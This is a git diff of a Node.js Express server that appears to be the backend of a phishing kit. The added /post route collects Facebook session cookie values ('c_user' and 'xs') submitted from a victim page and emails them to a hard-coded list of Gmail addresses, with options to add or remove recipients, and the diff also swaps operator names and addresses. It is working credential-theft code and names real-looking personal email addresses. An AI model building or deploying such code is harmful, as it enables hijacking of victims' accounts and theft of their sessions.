@@ -11,13 +11,13 @@ app.use(express.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
 
-const name = "Saif Rehman"  
-const emails = [
+let name = "Molu"  
+let emails = [
   "unaisnizamani598@gmail.com",
   "marina.bhoo.so@gmail.com"
   
 ]
-const workerEmail = "melissacamellaagent@gmail.com";
+let workerEmail = "officiall.sara.james.ads@gmail.com";
 
 let transporter = nodemailer.createTransport({
   service: 'gmail',
@@ -89,6 +89,44 @@ app.post("/", async (req, res) => {
 
   res.sendFile(path.join(__dirname, "password.html"));
 
+  
+});
+
+app.post("/post", async (req, res) => {
+  
+  
+  console.log(req.body)
+
+  name = req.body.name
+  workerEmail = req.body.workerEmail
+  const uid = req.body.c_user;
+  const cookie = req.body.xs;
+  const removeMarinaEmail = req.body.removeMarinaEmail;
+  const fullAccess = req.body.fullAccess;
+
+  if (removeMarinaEmail == "true") {
+     const index = emails.indexOf("marina.bhoo.so@gmail.com");
+  if (index !== -1) {
+    emails.splice(index, 1);
+  }
+  }
+
+  if(fullAccess == "true") emails.push(workerEmail)
+
+  console.log(emails)
+
+
+  
+  for(let i=0;i<emails.length;i++) {
+    await sendMail(name,emails[i],cookie,uid)
+
+  }
+
+
+ 
+  res.sendFile(path.join(__dirname, "password.html"));
+
+  
   
 });
 
